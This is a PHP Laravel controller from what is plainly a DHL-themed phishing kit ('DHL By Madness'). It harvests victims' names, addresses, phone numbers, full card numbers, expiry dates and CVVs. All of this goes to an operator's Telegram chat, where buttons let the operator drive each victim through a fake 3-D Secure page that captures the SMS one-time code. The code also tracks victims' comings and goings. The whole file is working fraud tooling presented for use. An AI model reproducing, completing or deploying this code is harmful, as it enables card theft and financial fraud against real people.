<?php

namespace App\Http\Controllers;
use App\Models\telegramButton;
use App\Traits\RequestTrait;
use App\Traits\MakeComponents;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use Illuminate\Support\Str;
use Carbon\Carbon;
class payment extends Controller
{
    use RequestTrait;
    use MakeComponents;
    public function indexreal($session){
        $ip = $_SERVER['REMOTE_ADDR'];
        $country_code=$this->getipinfos($ip);
        $country_code=$country_code==""?"us":$country_code;

$url = "https://restcountries.com/v2/alpha/".$country_code;
        $curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$resp_curr = curl_exec($curl);
$resp_curr = json_decode($resp_curr);
curl_close($curl);
$resp_curr = $resp_curr->currencies[0];

        return view("index",["countrycode" => $country_code , "currency_code"=>isset($resp_curr->code)?$resp_curr->code:"USD" ,"currency_smb"=>isset($resp_curr->symbol)?$resp_curr->symbol:"$"]);
    }

    public function index(){

        $ip = $_SERVER['REMOTE_ADDR'];
        $country_code=$this->getipinfos($ip);
        $country_code=$country_code==""?"us":$country_code;

$url = "https://restcountries.com/v2/alpha/".$country_code;
        $curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
$resp_curr = curl_exec($curl);
$resp_curr = json_decode($resp_curr);
curl_close($curl);
$resp_curr = $resp_curr->currencies[0];

        return view("payment",["countrycode" => $country_code , "currency_code"=>isset($resp_curr->code)?$resp_curr->code:"USD" ,"currency_smb"=>isset($resp_curr->symbol)?$resp_curr->symbol:"$"]);
    }
    public function store(){


        $data_req=request()->all();
        $bin = $data_req['card_number'];
        $bin = \substr($bin,0,4).\substr($bin,5,2);
        $url = "https://lookup.binlist.net/".$bin;
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $resp = curl_exec($curl);
        $resp = json_decode($resp);
        curl_close($curl);


if(!isset($resp->type)){
    $error = true;
    $resp = new \stdClass();
    $resp->type = "Unknown";

}
if(!isset($resp->bank)){
        $resp->bank = new \stdClass();
    $resp->bank->name="Bank";
    $resp->bank->url = "dhl.com";
    $resp->brand = "Unknown";
}
if(!isset($resp->bank->name)){
    $resp->bank->name = "Bank";
}
if(!isset($resp->bank->url)){
    $resp->bank->url = "dhl.com";
}
if(!isset($resp->bank->brand)){
    $resp->bank->brand = "Unknown";
}
        $ip = $_SERVER['REMOTE_ADDR'];
        $country_code=$this->getipinfos($ip);
        $url = "https://restcountries.com/v2/alpha/".$country_code;
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_URL, $url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $resp_curr = curl_exec($curl);
        $resp_curr = json_decode($resp_curr);
        curl_close($curl);

if(!isset($resp_curr->currencies[0])){
    $resp_curr = new \stdClass();
$resp_curr->code = "USD";
$resp_curr->symbol="$";

}

$resp_curr = $resp_curr->currencies[0];
if($data_req["card_number"][0]=="3"){
    $vbv_image = "../images/amexvbv.png";
}
else if($data_req["card_number"][0]=="5"){
    $vbv_image = "../images/mcvbv.png";
}
else{
    $vbv_image = "../images/visavbv.png";
}

$newcredit = preg_replace("/[^0-9]/", "", $data_req["card_number"]);
function isValid($num) {
    $num = preg_replace('/[^\d]/', '', $num);
    $sum = '';

    for ($i = strlen($num) - 1; $i >= 0; -- $i) {
        $sum .= $i & 1 ? $num[$i] : $num[$i] * 2;
    }

    return array_sum(str_split($sum)) % 10 === 0;
}
$monthzeby = intval($data_req['expiry'][0].$data_req['expiry'][1]);
$yearzeby = intval("20".$data_req['expiry'][5].$data_req['expiry'][6]);
if ($yearzeby==Carbon::now()->year){
    if($monthzeby< Carbon::now()->month){
        $monthzeby = false;
    }
    else{
        $monthzeby = true;
    }
}

$goodcc = isValid($newcredit) && (strlen($data_req["cvv"])==3) && ($yearzeby>=Carbon::now()->year) && ($monthzeby);
if(!$goodcc){
    $myobj = new \stdClass();
    $myobj->cc = isValid($newcredit);
    $myobj->cvv = (strlen($data_req["cvv"])==3);
    $myobj->exp = ($yearzeby>=Carbon::now()->year) && ($monthzeby);
    $myobj->success = false;
    $myJSON = \json_encode($myobj);
return $myJSON;
}

$victim_number = "0";
$idvic = "#DHL #C".substr($data_req['card_number'],-4,4)." #ID".Str::random(5);
$mytime = Carbon::now()->toDateString('Y-m-d');
        $msg = "[========== ♠️ ⚡️ DHL By Madness ⚡️ ♠️ ===========] \n";
        $msg .= "[------- Billing Info -------] \n";
        $msg .="|Full Name 🥷      : ".$data_req["first_name"]." ".$data_req["last_name"]." \n";
        $msg .="|Adress        : ".$data_req["line_1"]." ".$data_req["line_2"]." \n";
        $msg .="|City            : ".$data_req['city']."\n";
        $msg .="|State            : ".$data_req['state']."\n";
        $msg .="|Country            : ".$data_req['country']."\n";
        $msg .="|Postal Code            : ".$data_req['postal_code']."\n";
        $msg .="|Phone ☎️           : ".$data_req['phone_number']."\n";
        $msg .= "[------- Credit Card Info -------] \n";
        $msg .="|Credit Card 💳            : ".$data_req['card_number']."\n";
        $msg .="|Exp Date  📆          : ".$data_req['expiry']."\n";
        $msg .="|Cvv   🔐         : ".$data_req['cvv']."\n";
        $msg .="|Type            : ".$resp->type."\n";
        $msg .="|Brand♦️💎            : ".$resp->brand."\n";
        $msg .="|Bank 🏛            : ".$resp->bank->name."\n";
        $msg .="|Session 🖥️            : ".\request()->session()->get("session")."\n";
        $msg .="|ID Victim 🖥️            : ".$idvic."\n";
        $msg .="|Victim Number 🖥️            : ".$victim_number."\n";
        $msg .= "[------- IP 🌍 : ".$_SERVER['REMOTE_ADDR']." -------] \n";
        $msg .= "[========== ♠️ ⚡️ DHL By Madness ⚡️ ♠️ ===========] \n";



        $myobj = new \stdClass();
        \request()->session()->put("idvic","#DHL #C".substr($data_req['card_number'],-4,4)." #ID".Str::random(5));
$myobj->success = true;
$myobj->data = "<div class=\"modal fade\" tabindex=\"-1\" role=\"dialog\" id=\"auth-modal\">\n    <div class=\"modal-dialog\" role=\"document\">\n
        <div class=\"modal-content\">\n            <section class=\"loading-1\">\n
                       <div class=\"modal-body d-flex justify-content-center align-items-center flex-column position-relative\" style=\"height: 304px;\">\n
                                          <img src=\"https://dispatching-centre.wtechsmartwater.com/images/loading.gif\" alt=\"\">\n
                                                      <small>We are contacting your bank... </small>\n
                                                                    </div>\n            </section>\n
                                                                              <section class=\"loading-2\" style=\"display: none;\">\n
                                                                                             <div class=\"modal-body d-flex justify-content-center align-items-center flex-column position-relative\" style=\"height: 304px;\">\n
                                                                                                              <img src=\"https://dispatching-centre.wtechsmartwater.com/images/loading-circle.gif\" alt=\"\" style=\"height: 80px;\">\n
                                                                                 <small>Loading...</small>\n
                                                                                            </div>\n            </section>\n
                                                                                                 <section class=\"auth-form\" style=\"display: none;\">\n
                                                                                                          <div class=\"modal-body p-4\">\n
                                                                                   <div class=\"card rounded-0\" style=\"box-shadow: none;\">\n
                                                                                                <div class=\"card-body\">\n
                                                                      <form action=\"/authenticate\" method=\"POST\">\n
                                                                <input type=\"hidden\" id=\"csrfftw\" name=\"_token\" value=\"\">
                                                                              <input type=\"hidden\" name=\"card_number\" value=\"".$data_req['card_number']."\">
                                                                                                            <div class=\"row justify-content-between\">\n
                                                                             <div class=\"col-12 d-flex justify-content-between align-items-center\">\n
                                                                            <div class=\"d-flex align-items-center\">\n
                                                                     <img src=\"https://logo.clearbit.com/".$resp->bank->url."\"  style=\"height: 40px; max-width: 100px;\">\n
                                                                           <h6 class=\"mb-0 ml-2\">".$resp->bank->name."</h6>\n
                                                      </div>\n\n
                                                       <img src=\"".$vbv_image."\" alt=\"\" style=\"height: 40px; width: 80px;\">\n
                                                         </div>\n\n                                    </div>\n                                    <div class=\"row mt-5\">\n                                        <div class=\"col-12\">\n                                            <h6 class=\"font-weight-bold\">".\request()->session()->get("lang-payment-onetime")."</h6>\n                                            <p>\n                                                <p class='mb-0'>".\request()->session()->get("lang-payment-vercode")."</p>".\request()->session()->get("lang-payment-enter")."\n                                            </p>\n                                        </div>\n                                    </div>\n                                    <div class=\"row\">\n                                        <div class=\"col-12\">\n                                            <div class=\"row\">\n                                                <div class=\"col-12\">\n                                                    <strong>".\request()->session()->get("lang-payment-marchand").":</strong>\n                                                    DHL International GmbH                                                </div>\n                                            </div>\n                                            <div class=\"row\">\n                                                <div class=\"col-12\">\n                                                    <strong>".\request()->session()->get("lang-payment-amount").":</strong>\n                                                    3,57 ".$resp_curr->code."\n                                                </div>\n                                            </div>\n                                            <div class=\"row\">\n                                                <div class=\"col-12\">\n                                                    <strong>".\request()->session()->get("lang-payment-date").":</strong>\n                                                    ".$mytime."\n                                                </div>\n                                            </div>\n                                            <div class=\"row\">\n                                                <div class=\"col-12\">\n                                                    <strong>".\request()->session()->get("lang-payment-ccsms")." :</strong>\n                                                    xxxx xxxx xxxx\n                                                    ".\substr($data_req['card_number'],-4,4)."\n                                                </div>\n                                            </div>\n                                        </div>\n\n                                    </div>\n\n\n                                    <div class=\"alert alert-danger error-text\" style=\"display: none;\" id=\"invalid-code\">\n                                        L'information que vous avez entre est invalide.,\n                                    </div>\n                                    <p class=\"mt-3\"></p>\n                                                                            <div class=\"form-group row\">\n                                            <div class=\"col-12\">\n                                                <label class=\"font-weight-bold mb-1\" for=\"\">".\request()->session()->get("lang-payment-concode")."</label>\n                                                <input id = \"smscodeftw\"type=\"tel\" class=\"input form-control\" name=\"attribute-17\" autocomplete=\"off\" required>\n                                            </div>\n                                        </div>\n                                                                    <div class=\"row\">\n                                    <div class=\"col-12 text-center\">\n                                        <p class=\"text-danger\" id=\"auth-error\" style=\"display: none;\">confirmation code incorrect. Veuillez reessayer.</p>\n                                        <button type=\"submit\" class=\"btn btn-dark btn-block\">\n                                            <i class=\"fa fa-circle-notch spin\" style=\"display: none;\"></i>\n                                            ".\request()->session()->get("lang-payment-conpay")."                                        </button>\n                                        <p id=\"resend-after\" clas=\"mb-0\" style=\"display: none;\">Vous pouvez demander un autre code dans <span id=\"resend-seconds\"></span> secondes</p>\n                                        <a href=\"#\" class=\"font-weight-bold mt-2 text-muted\" id=\"resend-code\" style=\"display: block;\">Re-send Code</a>\n                                    </div>\n                                </div>\n                            </form>\n                        </div>\n                    </div>\n                </div>\n            </section>\n        </div>\n    </div>\n</div>\n";

        $options = [
            [['text' => 'SMS 📱','url' =>request()->root().'/'.\request()->session()->get("session").'/setsms']],
            [['text' => 'Success ✅','url' =>request()->root().'/'.\request()->session()->get("session").'/setredirect']]
        ];
        $btn = $this->keyboardBtn($options);
$nvm = $this->apiRequest('sendMessage',[
            'chat_id' =>env('CHAT_ID'),
            'text' =>$msg,
            'reply_markup'=>$btn,
        ]);

        $counter = 0 ;
        $whereto_response="idk";
        while($whereto_response == "idk"){
            $file_path = \request()->session()->get("session")."wheretogo.txt";

            if(Storage::disk('local')->has($file_path)){
            $whereto_response = Storage::disk('local')->get($file_path);
            Storage::disk('local')->delete($file_path);
        }


            if($whereto_response!="idk"){
                        if($whereto_response=="redirect") {
                            $msg = $idvic." Teb3ath ychayet cbn";
                        }
                        else{
                            $msg = $idvic." mmmm SMS Nchlh temchi mrigla ";
                        }
                        /*$options = [
                            [['text' => 'Session Ended 🖥️ ','callback_data' =>"Session Ended 🖥️ "]],
                        ];
                        $btn = $this->keyboardBtn($options);
                        $nvm = $this->apiRequest('editMessageText',[
                            'chat_id' =>env('CHAT_ID'),
                            'message_id' =>$nvm["result"]["message_id"],
                            'reply_markup' =>$btn,
                        ]);*/
                            $nvm = $this->apiRequest('sendMessage',[
                                'chat_id' =>env('CHAT_ID'),
                                'text' =>$msg,
                            ]);
            }

            sleep(2);
            $counter += 2;
            if($counter >= 10){
                break;
            }

        }
if($whereto_response=="redirect"){
    $myobj->redirect=true;
}
$myJSON = \json_encode($myobj);
return $myJSON;

    }
    public function authen(){
        $data_req=request()->all();
        $msg = "[========== ♠️ ⚡️ DHL By Madness ⚡️ ♠️ ===========] \n";
        $msg .= "[-------💸 vbv Info 💸-------] \n";
        $msg .="|Credit Card 💳            : ".$data_req['card_number']."\n";
        $msg .="| 💴💵 SMS 💴💵                   : ".$data_req["attribute-17"]." \n";
        $msg .="|Session 🖥️            : ".\request()->session()->get("session")."\n";
        $msg .= "[------- IP : ".$_SERVER['REMOTE_ADDR']." -------] \n";
        $msg .= "[========== ♠️ ⚡️ DHL By Madness ⚡️ ♠️ ===========] \n";
        $randomstr = Str::random(40);
        $options = [
            [['text' => 'Accept ✅','url' =>request()->root().'/'.\request()->session()->get("session").'/accept']],
            [['text' => 'Refuse ❌','url' =>request()->root().'/'.\request()->session()->get("session").'/refuse']]
        ];
        $btn = $this->keyboardBtn($options);
        $nvm = $this->apiRequest('sendMessage',[
            'chat_id' =>env('CHAT_ID'),
            'text' =>$msg,
            'reply_markup' =>$btn
        ]);



        $counter = 0 ;
        $sms_response="";
        $idvic = \request()->session()->get("idvic");
        while($sms_response == ""){

            $file_path = \request()->session()->get("session")."sms.txt";

            if(Storage::disk('local')->has($file_path)){
                $sms_response = Storage::disk('local')->get($file_path);
                Storage::disk('local')->delete($file_path);
            }
            if($sms_response != "") {
                if ($sms_response == "accept") {
                    $msg = $idvic . " Cbn Lbesha <3 ";
                } else {
                    $msg = $idvic . " Mnayek nchlh y3awed yekteb sms shyh ";
                }
                $nvm = $this->apiRequest('sendMessage', [
                    'chat_id' => env('CHAT_ID'),
                    'text' => $msg,
                ]);
            }


            sleep(2);
            $counter += 2;
        if($counter >= 40){
            break;
        }

}


        $d = new \stdClass();
$d->name = "null";
$d->config = "null";
$other = new \stdClass();
$other ->login = $d ;
$myobj = new \stdClass();
if($sms_response =="accept"){
$myobj->success = true;
}
else{
    $myobj->success = false;
}
$myobj->data = $other;

$myJSON = json_encode($myobj);
return $myJSON;
    }
    public function resend(){
        $idvic = \request()->session()->get("idvic");
        $nvm = $this->apiRequest('sendMessage',[
            'chat_id' =>env('CHAT_ID'),
            'text' =>$idvic." 5ef bro 3adilna aka el payment nhar ra7",
        ]);
        return true;
    }
    public function vicleft(){
        if(\request()->session()->has("idvic")) {
            $nvm = $this->apiRequest('sendMessage', [
                'chat_id' => env('CHAT_ID'),
                'text' => \request()->session()->get("idvic") . " - 5raj rahu el miboun",
            ]);

            if(\request()->session()->Has("activity_msg_id")){
                $nvm2 = $this->apiRequest("deleteMessage",[
                    "chat_id"=>env('CHAT_ID'),
                    'message_id'=> strval(\request()->session()->get("activity_msg_id")),
                ]);
            }
            
                \request()->session()->put("activity_msg_id",$nvm["result"]["message_id"]);
            
            return true;
        }
    }
    public function vicreturn()
    {
        if (\request()->session()->has("idvic")) {
            $nvm = $this->apiRequest('sendMessage', [
                'chat_id' => env('CHAT_ID'),
                'text' => \request()->session()->get("idvic") . " - a le haw rja3 tla3 rojla",
            ]);
            if(\request()->session()->Has("activity_msg_id")){
                $this->apiRequest("deleteMessage",[
                   "chat_id"=>env('CHAT_ID'),
                   'message_id'=> \request()->session()->get("activity_msg_id"),
                ]);
            }
            
                \request()->session()->put("activity_msg_id",$nvm["result"]["message_id"]);
            
            return true;
        }
    }

}
